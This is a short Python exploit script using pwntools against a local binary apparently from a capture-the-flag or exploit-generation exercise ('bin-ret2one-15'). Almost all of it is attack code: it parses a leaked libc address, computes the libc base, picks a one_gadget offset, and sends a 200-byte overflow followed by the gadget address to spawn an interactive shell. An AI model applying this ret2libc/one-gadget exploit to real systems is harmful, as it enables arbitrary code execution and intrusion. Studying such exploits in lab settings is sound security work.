from pwn import *
import Fart_ROP
from analyze import *

def one_gadget():
    return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', '/opt/libc.so.6']).decode().split(' ')]

logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = './old/bins2/bin-ret2one-15'
f_anal = Analyze(binary, '')
f_rop  = Fart_ROP.ROP(f_anal, 0)

e = context.binary = ELF(binary)

context.terminal = ["tmux", "splitw", "-h"]


gs = '''
b vuln
continue
'''

#p  = gdb.debug(e.path, gdbscript=gs)
p = process(binary)

p.recvuntil(b": ")
leak = int(p.recvline().decode('utf-8').strip(), 16)

base = leak - f_anal.libc.sym[f_anal.find_leaked_function()]
print(hex(base))

gadget_offset = one_gadget()[1]
print(hex(gadget_offset))
gadget_addr = base + gadget_offset

payload = b"A"*200
payload += p64(gadget_addr)
payload += p64(0)*0x50

print(len(payload))
p.sendline(payload)
p.interactive()
